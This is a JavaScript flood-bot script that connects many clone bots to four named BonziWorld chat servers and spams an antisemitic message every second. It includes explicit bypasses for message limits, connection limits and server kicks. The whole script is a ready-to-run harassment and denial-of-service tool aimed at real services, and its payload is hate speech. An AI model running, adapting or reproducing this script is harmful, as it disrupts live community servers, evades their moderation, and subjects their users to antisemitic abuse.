// Multi-Server Flood Bot - Spawns duplicate clone bots with BonziData Integration
(() => {
  // Import BonziData structure from bonzi.gay
  const BonziData = {
    colors: ["black", "blue", "brown", "cyan", "green", "pink", "purple", "red", "white", "yellow", "blessed", "noob", "glow", "pope"],
    hats: ["bear", "bfdi", "bieber", "bowtie", "bucket", "chain", "cigar", "dank", "elon", "evil", "horse", "illuminati", "kamala", "king", "maga", "obama", "pot", "propeller", "tophat", "troll", "truck", "witch", "wizard"]
  };
  
  // Random selection helpers
  function randomColor() {
    return BonziData.colors[Math.floor(Math.random() * BonziData.colors.length)];
  }
  
  function randomHat() {
    return BonziData.hats[Math.floor(Math.random() * BonziData.hats.length)];
  }
  
  // Configuration
  const serverUrls = [
    "https://bonzi.gay/",
    "https://bonziworld.org/",
    "https://bonzi.lol/",
    "https://bonziworld.co/"
  ];
  
  const maxBotsPerServer = 5; // Maximum bots per server
  const spawnDelay = 2000; // Delay between spawning new bots (ms)
  const messageDelay = 1000; // Delay between messages (ms)
  const autorejoin = true; // Auto-reconnect if disconnected
  
  // Custom message to spam
  const baseMessage = "ME JEWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW ";
  
  let totalBots = 0;
  let serverBotCounts = {};
  
  // Initialize bot counts for each server
  serverUrls.forEach(url => {
    serverBotCounts[url] = 0;
  });
  
  function spawnBot(serverUrl, botId) {
    try {
      console.log(`Attempting to spawn bot #${botId} on ${serverUrl}`);
      // Connection bypass: Use forceNew and randomized reconnection
      const socket = io(serverUrl, {
        forceNew: true,
        reconnection: true,
        reconnectionDelay: 1000 + Math.random() * 2000,
        reconnectionAttempts: 10,
        timeout: 20000,
        transports: ['websocket', 'polling']
      });
      
      socket.on('connect', () => {
        console.log(`✓ Bot ${botId} connected to ${serverUrl}`);
        
        socket.emit("client", "MAIN");
        socket.emit("login", {
          passcode: "",
          name: "Anonymous",
          room: "default"
        });
        
        // Set random color and hat from BonziData
        const botColor = randomColor();
        const botHat = randomHat();
        
        socket.emit("command", {
          list: ["color", botColor]
        });
        
        socket.emit("command", {
          list: ["hat", botHat]
        });
        
        console.log(`🎨 Bot ${botId} on ${serverUrl}: ${botColor} + ${botHat}`);
        
        // Start spamming messages with bypass after brief delay
        setTimeout(() => {
          let dashCount = 0;
          setInterval(() => {
            // Add bypass dashes to avoid message limit
            const bypass = '-'.repeat(dashCount % 10);
            socket.emit('talk', {
              text: baseMessage + bypass + Math.floor(Math.random() * 3000)
            });
            dashCount++;
            
            // Randomly change color and hat every 10 messages
            if (dashCount % 10 === 0) {
              socket.emit("command", { list: ["color", randomColor()] });
              socket.emit("command", { list: ["hat", randomHat()] });
            }
          }, messageDelay);
        }, 500);
      });
      
      socket.on('connect_error', (error) => {
        console.error(`✗ Bot ${botId} failed to connect to ${serverUrl}:`, error.message);
      });
      
      socket.on('error', (error) => {
        if (error.includes && error.includes('too many connections')) {
          console.log(`⚠️ Bot ${botId} on ${serverUrl}: Too many connections - retrying in ${3000 + botId * 500}ms...`);
          setTimeout(() => spawnBot(serverUrl, botId), 3000 + botId * 500);
        } else {
          console.error(`✗ Bot ${botId} on ${serverUrl} error:`, error);
        }
      });
      
      socket.on('disconnect', (reason) => {
        console.log(`Bot ${botId} disconnected from ${serverUrl}: ${reason}`);
        if (autorejoin && reason === 'io server disconnect') {
          // Server kicked us, try to reconnect with delay
          setTimeout(() => socket.connect(), 2000 + Math.random() * 3000);
        }
      });
      
    } catch (error) {
      console.error(`Failed to spawn bot ${botId} on ${serverUrl}:`, error);
    }
  }
  
  // Spawn bots across all servers
  const spawner = setInterval(() => {
    // Round-robin across servers
    const serverIndex = totalBots % serverUrls.length;
    const serverUrl = serverUrls[serverIndex];
    
    if (serverBotCounts[serverUrl] < maxBotsPerServer) {
      totalBots++;
      serverBotCounts[serverUrl]++;
      spawnBot(serverUrl, totalBots);
      console.log(`Spawned bot #${totalBots} (${serverBotCounts[serverUrl]}/${maxBotsPerServer} on this server)`);
    }
    
    // Check if all servers are at max capacity
    const allServersFull = serverUrls.every(url => serverBotCounts[url] >= maxBotsPerServer);
    if (allServersFull) {
      clearInterval(spawner);
      console.log(`All servers at max capacity. Total bots spawned: ${totalBots}`);
      console.log("Server distribution:", serverBotCounts);
    }
  }, spawnDelay);
  
  console.log("=== MULTI-SERVER FLOOD BOT STARTED ===");
  console.log(`Targeting ${serverUrls.length} servers:`);
  serverUrls.forEach((url, i) => console.log(`  ${i + 1}. ${url}`));
  console.log(`Max bots per server: ${maxBotsPerServer}`);
  console.log(`Spawn delay: ${spawnDelay}ms`);
  console.log(`Message delay: ${messageDelay}ms`);
  console.log(`Message: "${baseMessage}[bypass][random]"`);
  console.log("=======================================");
  console.log("✓ BonziData integration: ENABLED");
  console.log("✓ Message bypass: ENABLED");
  console.log("✓ Connection bypass: ENABLED");
  console.log("✓ Auto-rejoin: ENABLED");
  console.log("✓ Random colors/hats: ENABLED");
  console.log("⚠️ Connection limit bypass active - will retry on errors");
  console.log("Bots will attack all servers simultaneously!");
})();
